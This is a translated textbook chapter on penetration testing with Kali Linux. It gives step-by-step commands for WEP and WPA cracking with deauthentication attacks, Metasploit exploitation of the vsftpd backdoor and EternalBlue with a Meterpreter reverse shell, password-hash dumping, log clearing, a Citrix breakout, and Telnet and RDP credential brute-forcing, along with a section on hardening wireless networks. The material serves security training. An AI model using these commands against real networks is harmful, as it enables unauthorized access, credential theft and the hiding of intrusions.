# Kali Linux 2019 学习手册（三）

> 原文：[`annas-archive.org/md5/29591BFA2DAF3F905BBECC2F6DAD8828`](https://annas-archive.org/md5/29591BFA2DAF3F905BBECC2F6DAD8828)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第十章：网络渗透测试 - 获取访问权限

获取对系统和网络的访问权限是渗透测试中最关键的阶段之一。这一阶段测试了渗透测试员的技能和目标系统和网络的安全控制。渗透测试员必须始终考虑他们可以利用各种安全漏洞来攻击目标的所有可能方式。

如果没有进入企业网络，你将无法进行任何形式的网络渗透和数据外泄。渗透测试的目的是模拟真实世界中具有恶意意图的真正黑客会执行的攻击。这意味着未经授权地进入企业网络并破坏系统。

作为一名即将成为网络安全专业人员/渗透测试员，你将学习如何破解无线网络，利用 Linux 和 Windows 操作系统，利用远程访问服务，并获取用户帐户凭据以访问系统和网络。此外，你还将学习有关保护无线网络免受网络威胁的各种对策。

在本章中，我们将涵盖以下主题：

+   获取访问权限

+   **有线等效隐私**（**WEP**）破解

+   **Wi-Fi Protected Access**（**WPA**）破解

+   保护您的无线网络

+   配置无线安全设置

+   利用脆弱的外围系统

+   渗透测试 Citrix 和基于**远程桌面协议**（**RDP**）的远程访问系统

+   PWN 盒和其他工具

+   绕过**网络访问控制**（**NAC**）

# 技术要求

要按照本章的说明进行操作，请确保满足以下硬件和软件要求：

+   Kali Linux

+   Windows 7

+   无线路由器

# 获取访问权限

渗透测试和道德黑客是一个令人兴奋的话题。每个人都总是兴奋地想要黑入另一个系统，无论是计算机还是无线网络。之前的章节侧重于在发动攻击之前对目标进行足够的情报收集。黑客和渗透测试的利用阶段有时可能会具有挑战性。

收集有关目标的尽可能多的细节非常重要。这样的背景工作有助于我们确定可以针对目标系统或网络发动的近似利用和有效载荷。有时，当你发动一个针对特定操作系统的利用时，它可能不起作用，这可能会令人沮丧。你可以采取的一种策略是针对网络上的低 hanging fruits——也就是尝试利用和获取对易受攻击的系统和设备的访问权限，这些系统和设备对 TCP/IP 协议易受攻击。

一个例子是我们在之前的章节中探讨过并用来通过 shell 界面进入目标的**vsftpd**服务。另一个例子是在 Windows 操作系统上发现的**EternalBlue**漏洞。在扫描阶段期间，一定要对目标网络上的所有设备进行全面的漏洞评估。

首先利用看起来最脆弱、因此易于利用的目标，然后转向那些不太脆弱、因此更难利用的目标。举个例子，想象一下参加笔试。试卷上有很多需要在规定时间内回答的具有挑战性的问题。在这种情况下，明智的做法是先回答较容易的问题，然后再回答更困难的问题。这样可以给你更多时间回答你更有可能答对的问题，并最大限度地提高你在考试中得分的机会。

渗透测试员可以应用许多方法和技术来获取对系统的访问权限，例如以下方法：

+   在线和离线密码破解

+   破解无线网络上的**预共享密钥**（**PSK**）

+   社会工程

+   执行**中间人**（**MITM**）攻击

+   对应用层协议执行暴力破解攻击

在获取访问权限阶段，渗透测试人员通常执行各种类型的攻击，以帮助他们进入网络。通常，您首先执行在线或离线密码破解。一旦获得有效的用户名和密码，下一步就是访问受害者的系统并提升用户权限。获得更高级别的用户权限将允许在受损机器上执行任何应用程序和任务。隐藏文件，如恶意代码，旨在确保创建隐藏的后门，并且已经植入逻辑炸弹（一种包含一组由用户操作触发的指令的病毒）。最后，在断开与受损机器的连接时，总是明智地掩盖您的踪迹。掩盖您的踪迹是渗透测试的最后阶段，重点是删除任何表明攻击者曾在系统或网络上出现的日志文件和证据。

以下是获得系统访问权限的典型流程图：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/796f50d7-3ee1-487a-87ba-620eb285c8fe.png)

在接下来的章节中，我们将看看我们可以使用的各种方法，以便进入目标系统。

# WEP 破解

通过使用无线网络，具有 IEEE 802.11 兼容设备（如笔记本电脑）的用户可以连接到无线接入点。这将使他们能够访问本地网络上的资源，就像他们使用有线连接时一样。无线网络为用户提供了很多便利，无论是在家中还是在企业环境中。

默认情况下，无线网络是开放的，因此允许任何具有笔记本电脑或智能手机的人建立连接。这引发了用户隐私和安全方面的担忧。WEP 加密标准在无线网络的早期发展阶段被使用，并且仍然被家庭用户和 IT 管理员实施。

WEP 加密标准使用**Rivest Cipher 4**（**RC4**）加密密码，用于数据加密的**40 位密钥**。在开发时，这被认为是非常安全的，但到了 2002 年，标准中发现了多个安全漏洞。攻击者可以在几小时内获得加密密钥。使用 40 位密钥，攻击者可以非常快速地捕获和解密流量，这损害了 WEP 加密标准的机密性。在现代密码标准中，使用更大的加密密钥以防止对数据加密的此类攻击。

作为攻击性安全领域的网络安全专业人员，了解在使用 Kali Linux 执行 WEP 破解时应用的技术是很重要的。

执行以下步骤来完成此操作：

1.  使用以下命令在无线适配器上启用监视模式：

```
airmon-ng check kill airmon-ng start wlan0
```

1.  在附近的接入点上执行无线嗅探，直到发现目标：

```
airodump-ng wlan0mon
```

找到目标后，记下其 BSSID、频道和 ESSID 值。

1.  在获取详细信息后，使用键盘上的*Ctrl* + *C*停止`airodump-ng`，然后继续下一步。

1.  尝试捕获目标无线网络的数据包：

```
airodump-ng --bssid <target BSSID value> -c <channel #> wlan0mon -w <output file>
```

让我们看看一些这些命令的作用：

+   +   `--bssid`：允许您通过使用其 BSSID 值（接入点的媒体访问控制地址）指定特定接入点

+   `-c`：允许您设置无线电，使其监听特定频道

+   `-w`：特定于输出位置和文件名

1.  对目标执行去认证攻击。

对目标接入点执行去认证攻击将迫使任何连接的客户端取消关联。一旦客户端断开连接，它们将自动尝试重新连接到接入点。通过这样做，您正在尝试在客户端尝试重新认证时捕获 WEP 密钥：

```
aireplay-ng -0 0 -a <target's bssid> wlan0mon
```

当您捕获到 WEP 密钥（您将在运行`airodump-ng`的窗口上看到通知）时，您可以停止去认证攻击。

1.  接下来，让我们尝试破解 WEP 并检索秘钥。

一旦您在目标无线网络上捕获了足够的数据，请停止`airodump-ng`。在终端上使用`ls -l`命令，您会看到一个`.cap`文件。在新的终端窗口中，执行以下命令：

```
aircrack-ng -b <bssid of the access point> output_file.cap
```

此外，您可以使用以下简单命令来实现相同的任务：

```
aircrack-ng output_file.cap
```

以下屏幕截图是预期输出的示例：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/a7901ba9-ca30-49e4-86ba-74cc0751c482.png)

但是，您的 WEP 密钥将根据无线接入点的管理员设置的值而有所不同。输出密钥以十六进制格式给出，因此您现在可以使用这个基于十六进制的密钥来访问目标接入点。

完成本节后，您现在可以对无线网络执行 WEP 破解。在下一节中，我们将深入探讨如何执行 WPA 破解技术。

# WPA 破解

鉴于 WEP 中发现的安全漏洞，WPA 于 2002 年作为 IEEE 802.11 网络的改进无线安全标准而创建。WPA 使用**临时密钥完整性协议**（**TKIP**），该协议应用 RC4 加密密码套件，用于无线接入点和客户设备之间的数据隐私。

此外，**Wi-Fi 保护访问 2**（**WPA2**）后来被开发用于解决其前身的安全漏洞。WPA2 使用**高级加密标准**（**AES**）进行数据加密，而不是 RC4 密码。此外，WPA2 实施了**计数器模式与密码块链接消息认证码协议**（**CCMP**），取代了 TKIP。

现在，让我们进入有趣的部分，破解 WPA 以进入目标无线网络：

1.  在无线适配器上启用监视模式：

```
airmon-ng check kill airmon-ng start wlan0
```

1.  对附近的接入点进行无线嗅探，直到发现您的目标：

```
airodump-ng wlan0mon
```

一旦找到目标，请记下其 BSSID、信道和 ESSID 值。在获取详细信息后停止`airodump-ng`，然后继续下一步。

1.  尝试捕获目标无线网络的数据包：

```
airodump-ng --bssid <target BSSID value> -c <channel #> wlan0mon -w <output file>
```

1.  对目标进行去认证攻击。

对目标接入点进行去认证攻击将强制任何连接的客户端取消关联。一旦客户端断开连接，它们将自动尝试重新连接到接入点。通过这样做，您正在尝试在客户端尝试重新认证时捕获 WEP 密钥：

```
aireplay-ng -0 0 -a <target's bssid> wlan0mon
```

当您捕获到 WPA 握手时，如下面的屏幕截图所示，您可以停止去认证攻击：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/4a2da0c5-c84d-47ea-b804-4e508f497c46.png)

使用*Ctrl* + *C*停止去认证攻击，并继续下一步。

1.  要破解 WPA，我们将使用一个字典列表。使用**crunch**，您可以生成自己的自定义密码字典列表。此外，以下是 Kali Linux 上已预安装的各种字典列表的位置：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/294f7162-e739-4c43-b8b2-a1d0c0886a87.png)

一旦找到合适的字典列表，我们可以使用`aircrack-ng`工具和`-w`参数指定我们选择的字典列表。

1.  要开始 WPA 的密码破解，请使用以下命令：

```
aircrack-ng output_file.cap -w <wordlist>
```

`aircrack-ng`将尝试使用特定字典攻击列表，并在找到**密钥**时停止，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/49ada9bd-1b9a-43c1-b3f9-5087bb7a54b0.png)

有时，字典列表可能不包含密码，结果可能不尽人意。使用**crunch**工具创建自定义字典列表，或尝试使用`SecLists` GitHub 存储库中的字典列表[`github.com/danielmiessler/SecLists`](https://github.com/danielmiessler/SecLists)。

现在您已经完成了关于破解无线安全的部分，让我们来看看下一节，它涵盖了如何保护您的无线网络免受网络攻击。

# 保护您的网络免受上述攻击

正如您在上一节中看到的，渗透测试人员或恶意黑客可以尝试黑客入侵您的无线网络并获取秘钥（密码）。无论您是一名学生正在学习计算机安全课程，还是一名 IT 专业人士，或者只是一个爱好者，本节涵盖的主题是一些可以用来保护您的网络免受此类攻击的方法和技术。

在接下来的章节中，我们将涵盖以下主题：

+   SSID 管理

+   MAC 过滤

+   天线的功率级别

+   强密码

+   保护企业无线网络

让我们开始吧！

# SSID 管理

购买新的接入点或无线路由器时，默认的服务集标识符（SSID）通常是制造商的名称。例如，新 Linksys 接入点的默认 SSID（无线网络名称）将包含`Linksys`作为其 SSID。许多制造商这样做是为了帮助用户在设置新接入点时快速识别他们的无线网络。然而，许多个人和组织使用默认的 SSID。

保持默认的 SSID 不变可能会带来安全问题。假设您为家庭或组织获得了一个新的 Linksys 接入点，并且在设置过程中决定保持设备 SSID 的默认配置。单词`Linksys`将成为网络名称的一部分。作为进行附近接入点无线扫描的渗透测试人员，看到制造商的名称可以帮助对设备进行概括，并研究`Linksys` AP 的特定漏洞。

想象一下在扫描无线接入点时看到`Netgear`这个词。您可以简单地搜索一下这个特定品牌已知的安全漏洞和配置错误的列表，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/eb1d2f1a-8608-48ef-9a5e-bda1afa92ab3.png)

简而言之，您不应该使用任何可能吸引黑客或泄露接入点和组织身份的名称。我经常看到公司使用他们的组织名称创建 SSID，并且有时将 SSID 的目的作为名称的一部分。

一个例子是使用名称`CompanyName_Admin`。任何进行任何无线安全审计的渗透测试人员最初都会针对这样的网络。

隐藏 SSID 是一个好的做法，但仍然可以使用无线嗅探技术（如`airodump-ng`）来发现，正如前面的章节中所概述的。此外，在基于 Windows 的系统上，您可以使用 NetStumbler（[www.netstumbler.com](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=2ahUKEwidnMDXmfjiAhVFTd8KHTPZAS8QFjAAegQIABAB&url=http%3A%2F%2Fwww.netstumbler.com%2Fdownloads%2F&usg=AOvVaw1txhDBmLy67I3rlfCDYpX8)）和 inSSIDer（[`www.metageek.com/products/inssider/`](https://www.metageek.com/products/inssider/)）。

在下一节中，我们将讨论无线网络上 MAC 过滤的目的。

# MAC 过滤

每个受控接入点及其无线路由器为连接设备提供基本类型的访问控制。在接入点上启用 MAC 过滤允许您指定允许和禁止连接到接入点的设备的列表。然而，有一些技术，所有这些都在前一章中涵盖过，允许渗透测试人员捕获授权设备的列表（它们的 MAC 地址）并执行欺骗以获取未经授权的访问。然而，仍应应用此功能，因为在您的网络上有某种安全性总比没有安全性要好。

在下一节中，我们将介绍天线功率级别的概念。

# 天线功率级别

一些接入点在其操作系统或固件中具有一个功能，允许您手动调整天线的功率级别。通过降低天线的功率级别，无线信号的广播范围将减小。将功率级别设置为 100%将确保信号具有最大覆盖范围。如果您担心其他人能够在无线网络上看到并拦截您的数据，这个功能可能会很有用。

现在我们了解了功率级别在天线上的作用，接下来我们将介绍创建强密码的基本要点。

# 强密码

破解用户密码通常取决于密码本身的复杂性。许多用户倾向于在其设备上设置简单易记的口令，特别是在无线网络上。然而，复杂的密码会给渗透测试人员或黑客带来困难。复杂密码具有以下特点：

+   它们包含大写字符

+   它们包含小写字符

+   它们包含数字

+   它们包含特定符号

+   它们的长度超过 12 个字符

+   它们不包含姓名

+   它们不包含出生日期

+   它们不包含车辆的车牌号码

以下是由**LastPass**（[www.lastpass.com](http://www.lastpass.com)）生成的复杂密码的示例：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/dc788631-cd18-459b-b1e6-75dfe2bb6611.png)

目的是确保没有人能够轻易猜测或破坏您的密码。如果恶意用户能够破坏另一个人的用户凭据，攻击者可以对受害者的网络和/或个人生活造成严重破坏。

在接下来的部分，我们将描述可以在企业网络上实施的技术，以改善其安全状况。

# 保护企业无线网络

企业无线网络应该使用以下技术来减少无线网络攻击的风险：

+   在组织拥有和管理的每个无线网络上实施**无线入侵防范系统**（**WIPS**）。

+   确保所有有线和无线设备都安装了最新的固件和补丁。

+   确保设备和配置符合**国家标准和技术研究所**（**NIST**）的要求。查看 NIST 框架中的*建立无线强大安全网络*部分，了解更多信息：[`csrc.nist.gov/publications/detail/sp/800-97/final`](https://csrc.nist.gov/publications/detail/sp/800-97/final)

+   尽可能实施多因素身份验证来访问企业网络。

+   实施**可扩展认证协议**（**EAP**）—**传输层安全**（**TLS**）基于证书的方法，以确保无线通信的机密性和真实性。

+   使用带有 AES 加密的 WPA2-企业版。

+   实施一个独立的访客无线网络。

实施这些技术和控制措施可以帮助减少企业网络上的安全风险。在接下来的部分，我们将介绍配置和保护无线网络所需遵循的步骤。

# 配置无线安全设置以保护您的网络

在本节中，我们将讨论如何在接入点和无线路由器上配置无线安全功能，以便您可以保护您的网络。

在这个练习中，我使用的是 Linksys EA6350 无线路由器。请注意，所有无线路由器和接入点在其管理界面中具有相同的功能；但是，每个制造商和设备的**图形用户界面**（**GUI**）可能会有所不同。

让我们开始吧！

1.  您需要登录您的接入点或无线路由器。

1.  登录后，点击用户界面中的**无线**选项卡。在这里，您可以更改网络名称（SSID），设置复杂密码，设置安全模式，并广播 SSID，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/f3b35409-f934-4158-b618-0230245cb37a.png)

使用以下准则将有助于提高无线网络的安全性：

+   +   将 SSID（网络名称）更改为不会引起注意的内容。

+   隐藏（广播）SSID。

+   创建一个复杂的密码。如果遇到困难，请尝试使用在线密码生成器。

每个现代接入点和无线路由器都允许使用各种安全模式，例如以下内容：

+   +   **无**：禁用认证。

+   **WEP**：使用 WEP 加密标准。

+   **WPA 个人**：使用 WPA 加密标准，并允许您在接入点上设置**预共享密钥**（**PSK**）。因此，任何需要访问无线网络的设备都需要提供 PSK。

+   **WPA 企业**：此模式应用 WPA 加密标准，但请注意，接入点将用户凭据存储在 WPA 个人中。WPA 企业查询中央**认证、授权和计费**（**AAA**）服务器，以验证用户在无线网络上的访问。

+   **WPA2 个人**：使用 WPA2 加密标准。

+   **WPA2 企业**：使用 WPA2 加密标准与 AAA 服务器。

您可以选择禁用 SSID 广播以隐藏您的网络。

1.  接下来，您应该看到另一个子选项卡，允许您配置**MAC 过滤**。

1.  启用 MAC 过滤功能。一旦启用，您将有选项将 MAC 地址添加到允许或拒绝列表中，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/1d433110-1f30-400c-b9c5-803663dc8e82.png)

1.  最后，禁用**Wi-Fi Protected Setup**功能，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/e46571b8-224c-45b9-8f97-6ceb26f3b28f.png)

WPS 存在已知的安全漏洞，不应在安全环境中使用。

完成了这个练习，现在您可以配置和设置无线网络。在下一节中，我们将看看如何利用外围系统的基本要点。

# 利用 Metasploit 攻击易受攻击的外围系统

在网络上利用目标系统有时可能是一项具有挑战性的任务。利用程序只是设计用来利用安全漏洞（弱点）的代码片段。在第五章中，*被动信息收集*，第六章中，*主动信息收集*，和第七章中，*使用漏洞扫描器*，我们深入研究了使用各种工具如 Nmap 和 Nessus 在目标系统中建立安全漏洞。在本节中，我们将利用迄今为止已经开发的信息和技能，并使用 Metasploit 框架进行利用。

在本练习中，我们将使用我们的 Kali Linux 机器作为攻击者，Metasploitable 机器作为目标。让我们开始吧：

1.  让我们使用 Nmap 对目标进行**服务版本扫描**。这将帮助我们确定正在运行的端口、协议和服务版本。执行**`nmap -sV <目标 IP 地址>`**命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/80890eef-14a0-427b-8839-8c3bd729cfb3.png)

正如我们所看到的，目标上有许多服务。

1.  通过启用**PostgreSQL**数据库服务来启动**Metasploit**框架。然后，在终端窗口内初始化 Metasploit 框架并执行以下命令：

```
service postgresql start msfconsole
```

Metasploit 框架应该需要一两分钟来初始化。当准备好时，您将看到一个有趣的欢迎横幅和**命令行界面**（**CLI**）。

根据我们的 Nmap 结果，端口`21`是开放的，并且正在运行**文件传输协议**（**FTP**）。通过执行服务版本扫描，我们能够确定它是否正在运行**vsftpd 2.3.4**守护程序。在您的 Metasploit 界面上，您可以使用`search`命令，后跟关键字或字符串，搜索模块（扫描程序，利用程序等）。

1.  在您的 Metasploit 控制台上，通过运行以下命令搜索任何有用的模块，以帮助我们破坏目标机器上的 FTP 服务器：

```
search vsftpd
```

1.  Metasploit 将为我们提供符合搜索条件的结果列表。您应该看到控制台返回一个名为`vsftpd_234_backdoor`的基于 Unix 的利用。要在我们的目标上使用此利用，使用以下一系列命令：

```
msf5 > use exploit/unix/ftp/vsftpd_234_backdoor 
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.10.100 
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
```

在我的实验室环境中，目标使用`10.10.10.100` IP 地址。在设置`RHOSTS`（远程主机）值之前，请确保验证目标设备的 IP 地址。此外，许多模块将要求您设置远程目标。您可以使用`setg`命令全局设置目标。

1.  执行`exploit`命令。Metasploit 将尝试将利用代码推送到目标。一旦成功，将创建一个 shell。shell 允许我们从攻击者机器上远程执行命令到目标上，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/3a1e0848-b25b-4f21-843c-94d39b60b94b.png)

1.  在这一点上，任何在控制台上执行的命令都将在目标上执行。执行`uname -a`命令来验证并打印系统信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/481363eb-6936-42b7-89f4-7baeac5cad09.png)

通常，在对公共和内部系统进行简单的端口扫描时，端口`23`通常是用于远程管理的开放端口。但是，端口`23`是 Telnet 协议使用的默认端口。Telnet 是一种不安全的协议，允许用户通过网络远程访问计算机，并且所有通过用户之间传递的流量都是未加密的。任何启用 Telnet 的设备都容易受到中间人攻击，攻击者可以轻松捕获用户凭据。

1.  让我们使用`search`命令查找一个有用的模块，以检查 Telnet 启用设备上的有效用户凭据。首先，使用以下命令：

```
search telnet
```

1.  通常，将与搜索条件相符的结果列表呈现在控制台上。在这个练习中，我们将使用特定的扫描程序来检查验证的用户帐户：

```
msf5 > use auxiliary/scanner/telnet/telnet_login
```

1.  接下来，设置您的远程主机：

```
msf5 auxiliary(scanner/telnet/telnetlogin) > set RHOSTS 10.10.10.100
```

1.  如果您有包含不同用户名的单词列表，请使用以下命令（指定文件路径）：

```
msf5 auxiliary(scanner/telnet/telnetlogin) > set USER_FILE <username word list>
```

如果您有密码列表，可以选择使用以下命令：

```
msf5 auxiliary(scanner/telnet/telnetlogin) > set PASS_FILE <wordlist>
```

1.  但是，如果您没有任何单词列表，也没关系。您可以使用以下命令指定单个用户名和密码：

```
msf5 auxiliary(scanner/telnet/telnetlogin) > set USERNAME uname msf5 auxiliary(scanner/telnet/telnetlogin) > set PASSWORD word
```

1.  完成后，使用`run`命令执行`auxiliary`模块：

```
 msf5 auxiliary(scanner/telnet/telnetlogin) > run 
```

确保等待几秒钟让扫描器启动。有时，您不会立即在屏幕上看到结果出现。

我们使用`run`命令执行`auxiliary`模块，使用`exploit`命令在 Metasploit 中执行利用。

以下屏幕截图表明找到了有效的用户名和密码：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/9ee80d39-2897-4f46-937d-54fbad916663.png)

正如我们已经提到的，您可以使用**crunch**生成符合您喜好的自定义单词列表。此外，在 Kali Linux 的`/usr/share`目录中有一组单词列表：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/586929c6-bddc-4a2c-a4a0-0aa19aa9f797.png)

请记住，在进行密码攻击或尝试发现有效的用户凭据时，任务可能非常耗时，而且可能并不总是对您有利。然而，这说明了渗透测试中侦察（信息收集）阶段的重要性。我们能够收集有关目标的更多细节，我们就能够将广泛的攻击范围缩小到特定系统或网络基础设施的特定攻击。

接下来，我们将尝试利用并访问目标系统，即 Microsoft Windows。

# 永恒之蓝利用

让我们尝试利用 Windows 系统并获取 shell。对于这个练习，可以使用 Windows 7、8、8.1 或 10 操作系统作为目标/受害机器。以下是我实验室拓扑的图表，显示了攻击者和受害者机器的 IP 分配：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/67e797b6-45f1-407b-b863-2accfe1856d8.png)

如果您的 IP 方案不同，请确保在继续之前记录每台机器的 IP 地址，因为您将需要它们。让我们开始吧：

1.  首先，让我们尝试在目标 Windows 系统上运行漏洞扫描。以下代码片段是使用`nmap --script vuln 10.10.10.19`命令的结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/a0b55f75-b93e-4433-8764-caf919d82e4b.png)

突出显示的区域表明我们的目标对于 Microsoft 安全公告 ID `ms17-010`，也就是**EternalBlue**，存在远程代码执行攻击的漏洞。对这个漏洞的进一步研究告诉我们，目标容易受到 WannaCry、Petya 和其他恶意软件的利用。

EternalBlue 漏洞允许攻击者对 Microsoft SMBv1 服务器执行远程代码执行。

1.  在**Metasploit Framework**（**MSF**）控制台中，使用`search ms17-010`命令来过滤 EternalBlue 漏洞的结果，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/f11fbd64-e7a5-47d2-8c1e-dacc5ca11f97.png)

1.  MSF 控制台返回了一些结果。我们将使用`ms-17-010_eternalblue`漏洞和**Meterpreter 反向 TCP 有效载荷**来尝试从受害者的机器返回到我们的攻击者机器的反向连接（反向 shell）。为了完成这个任务，使用以下命令，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/f2b9dc69-f563-4fd6-ab2e-9032a1ec1f9b.png)

1.  执行漏洞利用后，您现在将拥有一个`meterpreter` shell。`meterpreter` shell 将允许您在攻击者机器和受害者操作系统之间无缝通信。

根据 SANS（[www.sans.org](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=2&cad=rja&uact=8&ved=2ahUKEwjjwcul2N3iAhUpTt8KHZ-9CJUQFjABegQICxAE&url=https%3A%2F%2Fwww.sans.org%2Fsecurity-resources%2Fsec560%2Fmisc_tools_sheet_v1.pdf&usg=AOvVaw0RrqNTtD6wrNTYHi-YFz2N))，Meterpreter 是 Metasploit 框架中的有效载荷，它通过作为已加载到目标机器上的任何进程内的 DLL 来运行，从而对被利用的目标系统进行控制。

使用`hashdump`命令，您将能够检索受害者机器上所有本地存储的用户帐户的密码哈希：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/c78932a7-61ec-4eb4-9c66-7732adac0843.png)

帐户的用户名始终以明文显示，如前面的屏幕截图所示。

在 Meterpreter 中的`hashdump`命令用于检索 Windows 系统中的用户帐户。用户帐户由三个组件组成：**安全 ID**（**SID**）、用户名和密码。密码被转换为 NTLM 哈希并存储在较新版本的 Windows 中。在较旧版本的 Windows 中，如 Windows XP，密码使用**LAN Manager**（**LM**）存储。因此，Windows 操作系统实际上从不存储用户帐户的密码；它存储哈希值。

以下是我们可以在`meterpreter` shell 中使用的一些有用的命令：

+   +   `screenshot`：捕获受害者桌面的屏幕截图

+   `getsystem`：尝试提升目标的特权

+   `clearev`：清除事件日志

+   `sysinfo`：收集有关目标的信息

1.  要在受害者的机器上获取 shell，请键入`shell`并按*Enter*：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/a2eac98e-3c3b-4867-abcb-a657577493bb.png)

现在您将在 Kali Linux 机器上拥有 Windows 命令提示符界面。现在您将能够远程执行 Windows 命令。

现在我们已经简要介绍了利用，让我们使用远程访问系统获取访问权限。

# 渗透测试 Citrix 和基于 RDP 的远程访问系统

在本节中，我们将研究在大多数 IT 环境中执行对两种流行的远程访问系统 Citrix 和 Microsoft 的**远程桌面协议**（**RDP**）的渗透测试。

让我们深入研究 Citrix 和 RDP 的渗透测试和获取访问权限。

# Citrix 渗透测试

我们中的大多数人可能已经听说过 Microsoft 的 RDP，它允许用户在网络中远程访问另一台 Windows 机器，并提供了一个**图形用户界面**（**GUI**）。Citrix 就像 RDP，但在性能方面更好，同时提供交互式用户界面。

许多组织使用 Citrix 服务和产品有效地在组织内分发对应用程序的访问。使用 Citrix 的一个例子是在组织的私人数据中心内运行应用程序。使用 Citrix，IT 管理员可以为这些应用程序的用户提供访问权限。每个用户都需要一个现代的 Web 浏览器来访问虚拟桌面界面或在数据中心中集中访问应用程序。这种方法消除了在每个员工的计算机上安装软件应用程序的需要。让我们开始吧：

1.  我们可以使用 Nmap NSE 脚本`citrix-enum-apps`来发现和提取应用程序。以下是在 Nmap 中使用脚本的示例：

```
nmap -sU --script citrix-enum-apps <citrix server IP address>
```

1.  此外，您可以指定`-p 1604`，因为 Citrix WinFrame 使用 TCP 和 UDP 端口`1604`。

1.  找到 Citrix 机器后，您可以尝试使用以下 URL 登录以连接到发布的应用程序：

```
http://<server IP>/lan/auth/login.aspx
```

1.  登录后，单击一个应用程序以下载`launch.ica`文件到您的桌面。下载完成后，使用记事本或其他文本编辑器打开文件。

1.  寻找一个名为`InitialProgram`的参数，指向`LIFE UAT`应用程序。将参数更改为`InitialProgram=explorer.exe`并保存文件。

1.  双击新保存的文件以打开 Citrix 服务器的资源管理器。这将使我们能够读取`lan/auth/login.aspx`文件和其他敏感文件。

1.  一旦你有了 Citrix 终端，环境可能会受限（空白屏幕）。打开**任务管理器**，然后单击**文件** | **新任务**。新任务窗口将打开。输入`explorer.exe`，然后单击**确定**。

1.  在 Windows 资源管理器中，导航到包含所有`.aspx`文件的目录，以确认您位于 Citrix 服务器上。

这种技术允许用户跳出**Citrix**虚拟化环境。在下一节中，我们将对 Microsoft RDP 执行渗透测试并尝试获取访问权限。

现在您已经完成了本节，让我们尝试利用企业环境中最流行的远程访问服务之一，Microsoft 的 RDP。

# RDP 入侵

Microsoft 的 RDP 为用户提供了一个图形界面，用于在网络上与基于 Windows 的系统建立连接。很多时候，系统管理员在组织中的客户端和服务器机器上启用 RDP 服务，以便轻松访问。启用设备上的 RDP 后，系统管理员无需亲自前往系统的地理位置来检查其配置或对操作系统进行调整。他们只需使用 RDP 登录即可。这种协议使 IT 专业人员的工作变得更加简单和高效。

该协议是为远程访问而设计的。但是，作为渗透测试人员，我们可以利用启用了 RDP 的系统，尝试发现目标系统的有效用户凭据。让我们开始吧：

1.  首先，我们可以使用 Nmap 扫描网络，同时搜索启用了 RDP 的任何设备。Windows 上的 RDP 使用端口`3389`，因此我们可以使用以下 Nmap 命令来扫描目标：

```
nmap -p 3389 -sV <target IP address>
```

以下屏幕截图显示了一个打开端口`3389`并运行`Microsoft Terminal Services`的系统：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/098e69ff-fbd1-483b-b980-d7cd80b77747.png)

1.  现在我们已经找到了一个合适的目标，我们可以对活动目标进行字典攻击。使用**Ncrack**（一种离线密码破解工具），我们可以使用可能的用户名列表（`usernames.txt`）和密码列表（`custom_list.txt`），如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/d3968035-9976-4a54-8adb-420ac02a95ad.png)

以下是在前面片段中使用的每个开关的描述：

+   +   `-v`：增加终端输出的详细程度。

+   `-T (0-5)`：调整攻击的时间。数字越大，攻击速度越快。

+   `-U`：允许您指定用户名列表。

+   `--user`：允许您指定用户名，每个用逗号分隔。

+   `-P`：允许您指定密码列表。

+   `--pass`：允许您指定密码，每个用逗号分隔。

+   `service://host`：Ncrack 使用此格式来指定服务和目标设备。

正如您所看到的，**Ncrack**能够找到目标（`10.10.10.19`）的有效用户名和密码组合。因此，一旦获得了用户的凭据，现在就可以简单地利用它们来使我们受益。

1.  在这一点上，一旦您获得了有效的用户帐户，下一步就是实际登录到目标系统，使用您在目标系统上找到的 RDP 和其他网络服务（Telnet、SSH、VNC 等）。

另一个**在线密码破解**工具我们可以使用是**Hydra**。要使用 Hydra 执行与 Ncrack 相同的任务，可以执行以下命令：

```
hydra -V -f -L usernames.txt -P custom_list.txt rdp://10.10.10.19
```

